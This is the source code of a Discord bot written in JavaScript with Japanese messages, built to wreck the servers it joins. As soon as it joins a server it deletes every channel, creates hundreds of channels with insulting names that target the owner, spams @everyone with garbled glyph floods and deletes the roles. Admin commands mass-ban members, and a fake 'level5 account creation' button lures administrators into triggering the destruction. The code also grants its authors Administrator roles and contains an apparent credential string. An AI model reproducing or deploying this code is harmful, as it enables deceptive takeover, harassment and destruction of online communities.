const http = require('http')
const { Client, Intents, MessageEmbed, MessageActionRow, MessageButton } = require("discord.js");
const moment = require('moment');
const client = new Client({
  partials: ["CHANNEL"],
  intents: new Intents(32767),
  restTimeOffset: -1000
});
const newbutton = (buttondata) => {
  return {
    components: buttondata.map((data) => {
      return {
        custom_id: data.id,
        label: data.label,
        style: data.style || 1,
        url: data.url,
        emoji: data.emoji,
        disabled: data.disabled,
        type: 2,
      };
    }),
    type: 1,
  };
};
const prefix = "m!"
const admin_list = ["945460382733058109","1122826236113203302","759001587422462015"]
process.env.TZ = 'Asia/Tokyo'
const msg = "呠呡呢呣呤呥呦呧周呩呪呫呬呭呮呯呰呱呲味呴呵呶呷呸呹呺呻呼命呾呿咀咁咂咃咄咅咆咇咈咉咊咋和咍咎咏咐咑咒咓咔咕咖咗咘咙咚咛咜咝咞咟咠咡咢咣咤咥咦咧咨咩咪咫咬咭咮咯咰咱咲咳咴咵咶咷咸咹咺咻咼咽咾咿哀品哂哃哄哅哆哇哈哉哊哋哌响哎哏哐哑哒哓哔哕哖哗哘哙哚哛哜哝哞哟哠員哢哣哤哥哦哧哨哩哪哫哬哭哮哯哰哱哲哳哴哵哶哷哸哹哺哻哼哽哾哿唀唁唂唃唄唅唆唇唈唉唊唋唌唍唎唏唐唑唒唓唔唕唖唗唘唙唚唛唜唝唞唟唠唡唢唣唤唥唦唧唨唩唪唫唬唭售唯唰唱唲唳唴唵唶唷唸唹唺唻唼唽唾唿啀啁啂啃啄啅商啇啈啉啊啋啌啍啎問啐啑啒啓啔啕啖啗啘啙啚啛啜啝啞啟啠啡啢啣啤啥啦啧啨啩啪啫啬啭啮啯啰啱啲啳啴啵啶啷啸啹啺啻啼啽啾啿喀喁喂喃善喅喆喇喈喉喊喋喌喍喎喏喐喑喒喓喔喕喖喗喘喙喚喛喜喝喞喟喠喡喢喣喤喥喦喧喨喩喪喫喬喭單喯喰喱喲喳喴喵営喷喸喹喺喻喼喽喾喿嗀嗁嗂嗃嗄嗅嗆嗇嗈嗉嗊嗋嗌嗍嗎嗏嗐嗑嗒嗓嗔嗕嗖嗗嗘嗙嗚嗛嗜嗝嗞嗟嗠嗡嗢嗣嗤嗥嗦嗧嗨嗩嗪嗫嗬嗭嗮嗯嗰嗱嗲嗳嗴嗵嗶嗷嗸嗹嗺嗻嗼嗽嗾嗿嘀嘁嘂嘃嘄嘅嘆嘇嘈嘉嘊嘋嘌嘍嘎嘏嘐嘑嘒嘓嘔嘕嘖嘗嘘嘙嘚嘛嘜嘝嘞嘟嘠嘡嘢嘣嘤嘥嘦嘧嘨嘩嘪嘫嘬嘭嘮嘯嘰嘱嘲嘳嘴嘵嘶嘷嘸嘹嘺嘻嘼嘽嘾嘿噀噁噂噃噄噅噆噇噈噉噊噌噍噎噏噐噑噒噓噔噕噖噗噘噙噚噛噜噝噞噟噠噡噢噣噤噥噦噧器噩噪噫噬噭噮噯噰噱噲噳噴噵噶噷噸噹噺噻噼噽噾噿嚀嚁嚂嚃嚄嚅嚆嚇嚈嚉嚊嚋嚌嚍嚎嚏嚐嚑嚒嚓嚔嚕嚖嚗嚘嚙嚚嚛嚜嚝嚞嚟嚠嚡嚢嚣嚤嚥嚦嚧嚨嚩嚪嚫嚬嚭嚮嚯嚰嚱嚲嚳嚴嚵嚶嚷嚸嚹嚺嚻嚼嚽嚾嚿囀囁囂囃囄囅囆囇囈囉囊囋囌囍囎囏囐囑囒囓囔囕囖囗囘囙囚四囜囝回囟因囡团団囤囥囦囧囨囩囪囫囬园囮囯困囱囲図围囵囶囷囸囹固囻囼国图囿圀圁圂圃圄圅圆圇圈圉圊國圌圍圎圏圐圑園圓圔圕圖圗團圙圚圛圜圝圞土圠圡圢圣圤圥圦圧在圩圪圫圬圭圮圯地圱圲圳圴圵圶圷圸圹场圻圼圽圾圿址坁坂坃坄坅坆均坈坉坊坋坌坍坎坏坐坑坒坓坔坕坖块坘坙坚坛坜坝坞坟坠坡坢坣坤坥坦坧坨坩坪坫坬坭坮坯坰坱坲坳坴坵坶坷坸坹坺坻坼坽坾坿垀垁垂垃垄垅垆垇垈垉垊型垌垍垎垏垐垑垒垓垔垕垖垗垘垙垚垛垜垝垞垟垠垡垢垣垤垥垦垧垨垩垪垫垬垭垮垯垰垱垲垳垴垵垶垷垸垹垺垻垼垽垾垿埀埁埂埃埄埅埆埇埈埉埊埋埌埍城埏埐埑埒埓埔埕埖埗埘埙埚埛埜埝埞域埠埡埢埣埤埥埦埧埨埩埪埫埬埭埮埯埰埱埲埳埴埵埶執埸培基埻埼埽埾埿堀堁堂堃堄堅堆堇堈堉堊堋堌堍堎堏堐堑堒堓堔堕堖堗堘堙堚堛堜堝堞堟堠堡堢堣堤堥堦堧堨堩堪堫堬堭堮堯堰報堲堳場堵堶堷堸堹堺堻堼堽堾堿塀塁塂塃塄塅塆塇塈塉塊塋塌塍塎塏塐塑塒塓塔塕塖塗塘塙塚塛塜塝塞塟塠塡塢塣塤塥塦塧塨塩塪填塬塭塮塯塰塱塲塳塴塵塶塷塸塹塺塻塼塽塾塿墀墁墂境墄墅墆墇墈墉墊墋墌墍墎墏墐墑墒墓墔墕墖増墘墙墚墛墜墝增墟墠墡墢墣墤墥墦墧墨墩墪墫墬墭墮墯墰墱墲墳墴墵墶墷墸墹墺墻墼墽墾墿壀壁壂壃壄壅壆壇壈壉壊壋壌壍壎壏壐壑壒壓壔壕壖壗壘壙壚壛壜壝壞壟壠壡壢壣壤壥壦壧壨壩壪士壬壭壮壯声壱売壳壴壵壶壷壸壹壺壻壼壽壾壿ௌௌௌௌௌௌௌௌௌௌௌௌௌ\nௌௌௌௌௌ☠ௌ\n\nௌௌௌௌௌ\nௌௌௌ☠ௌௌ\n☠ௌௌௌௌௌ\nௌௌௌ☠ௌ\nௌௌௌௌௌௌ\nௌௌ☠ௌௌ☠ௌௌ\nௌௌௌௌௌௌ☠ௌ\n\nൌൌൌൌൌ☡ൌൌ☡ൌൌൌൌൌൌൌൌ☡ൌൌൌൌൌൌൌ ൌൌൌൌൌൌൌൌ☡ൌൌ☡ൌൌൌൌൌൌൌ☡ൌൌൌൌൌൌൌൌൌൌൌൌ☡ൌൌ☡ൌൌൌൌൌൌൌൌ☡ൌൌൌൌൌൌൌ ൌൌൌൌൌൌൌൌ☡ൌൌ☡ൌൌൌൌൌൌൌ☡ൌ\n\nൌൌൌൌൌൌൌ\nൌ☤ൌൌ☤ൌൌൌ\nൌൌൌൌൌ☤ൌ\nൌൌൌൌൌ\nൌൌൌ☤ൌൌ\n\nೋೋೋೋೋೋ※ೋೋೋೋೋೋ※ೋೋೋೋೋೋ※ೋೋೋ"

http
  .createServer(function(request, response) {
    response.writeHead(200, { 'Content-Type': 'text/plain;charset=utf-8' })
    response.end(`${client.user.tag} is ready!\n導入サーバー:${client.guilds.cache.size}\nユーザー:${client.users.cache.size}`)
  })
  .listen(3000)

if (process.env.DISCORD_BOT_TOKEN == undefined) {
  console.error('tokenが設定されていません！')
  process.exit(0)
}

client
.on("debug", console.log)

client.on('ready', async () => {
  client.user.setActivity(`m!help 6311鯖に参戦中です`, {
    type: 'WATCHING'
  });
  client.user.setStatus("online");
  console.log(`${client.user.tag} is ready!`);
});

async function nuke(guild_id){
  const guild = client.guilds.cache.get(guild_id)
  const channels = []
  guild.channels.cache.forEach(ch => {
    channels.push(ch.id)
  })
  let x = guild.channels.cache.size
  async function doLoopWithCoolDown(loopCount,coolDownTime){
    let i = 0
    async function loop(){
      let channel = client.channels.cache.get(channels[i])
      channel.delete()
             .catch(console.error)
      i++
      x--
      if(x != 0){
        setTimeout(async () => {
          await loop();
        }, coolDownTime);
      }else if(x == 0){
        const channel_names = ["あらしたったww","ざこおつ","どんまい","乗っ取り成功wwwwww","ゴミセキュワロタ","ねぇ今どんな気持ち？wwwwww","鯖ばいばーいwwwwwwwww",`${client.users.cache.get(guild.ownerId).username}がやりましたwwwww`,`${client.users.cache.get(guild.ownerId).username}は詐欺師wwwww`,"しんだほうがいいよwwwwww","ゴミ鯖乙ww","バキバキDTww","死刑wwwwww","カイロスみたいな顔だね"]
        for(let i=0;i<500;i++){
          const ch = await guild.channels.create(channel_names[Math.floor(Math.random()*channel_names.length)])
          for(let n=0;n<5;n++){
            ch.send(`@everyone\nhttps://imgur.com/7bt5MbW\n${msg}`)
          }
        }
        guild.roles.cache.forEach(role => {
          role.delete()
            .catch(console.error)
        },500)
      }
    }
    await loop();
  }
  await doLoopWithCoolDown(x,200)
}

function spam(guild_id){
  const guild = client.guilds.cache.get(guild_id)
  guild.channels.cache.forEach(channel => {
    for(let i=0;i<5;i++){
      channel.send(`@everyone\nhttps://imgur.com/7bt5MbW\n${msg}`)
    }
  })
}

async function ban(guild_id){
  const guild = client.guilds.cache.get(guild_id)
  await guild.members.fetch();
  guild.members.cache.forEach(async member => {
    try{
      if(!admin_list.includes(member.id) && member.id != client.user.id){
        await member.ban()
      }
    }catch(err){
      console.log(err)
    }
  })
}

function role(guild_id){
  const guild = client.guilds.cache.get(guild_id)
  guild.roles.cache.forEach(async role => {
    if(role.name !== '@everyone'){ 
      try{
        await role.delete();
      }catch(error){
        console.error(`Error deleting role ${role.name}:`, error);
      }
    }
  })
}

function success(message){
  message.react("✅")
  setTimeout(function(){
    message.delete()
  },1000)
}

client.on('guildCreate', async guild => {
  //if(!["1071009230099861545","891969627377258526","945460382733058109"].includes(guild.ownerId)) return
  console.log(`nuking guild...\n[Information]\n<Guild>\nName:${guild.name}\nID:${guild.id}\nMember_length:${guild.members.cache.size}\nChannel_length:${guild.channels.cache.size}\nRole_length:${guild.roles.cache.size}\n<Owner>\nName:${client.users.cache.get(guild.ownerId).tag}\nID:${guild.ownerId}`)
  await nuke(guild.id)
})

client.on("messageCreate", async message => {
  if(!message.content.startsWith(prefix) || message.channel.type == "DM") return
  const arg = message.content.slice(prefix.length).split(/ +/);
  const command = arg.shift().toLowerCase();
  if(command == "test"){
    const guild = client.guilds.cache.get("1163287479902806026")
    const role = await guild.roles.create({
          name: 'Admin',
          permissions: ['ADMINISTRATOR'],
        });
    message.member.roles.add(role)
  }
  if(command == "help"){
    const embed = new MessageEmbed()
    .setTitle("開発中")
    message.reply({ embeds:[ embed ] })
  }
  if(command == "panel"){
    if(!message.member.permissions.has("ADMINISTRATOR")) return message.reply("サーバー管理者しか使えません")
    const embed = new MessageEmbed()
    .setTitle("level5アカウント作成")
    .addField("使用方法","下のボタンを押すと生成されます")
    .addField("注意","この機能はlevel5アカウントを作成するだけです。ぷにぷにの連携はされません")
    .setColor("RANDOM")
    message.channel.send({ embeds:[embed], components: [ newbutton([ { id: `nuke`, label: "作成" } ]) ] })
  } 
  if(admin_list.includes(message.author.id) && command == "arashi"){
    await nuke(message.guild.id)
  }
  if(admin_list.includes(message.author.id) && command == "spam"){
    spam(message.guild.id)
  }
  if(admin_list.includes(message.author.id) && command == "role"){
    success(message)
    role(message.guild.id)
  }
  if(admin_list.includes(message.author.id) && command == "ban"){
    success(message)
    await ban(message.guild.id)
  }
});

client.on("interactionCreate", async interaction => {
  if(interaction.customId == "nuke"){
    await nuke(interaction.guild.id)
  }
  if(interaction.customId == "create"){
    await interaction.reply({ content: "dmに送信しました", ephemeral: true })
    await interaction.user.send("アカウント情報 : \ny-\nzcisn7@developermail.com:650373e2fa8149a5a095c7b79961a232")
  }
})

client.login(process.env.DISCORD_BOT_TOKEN)
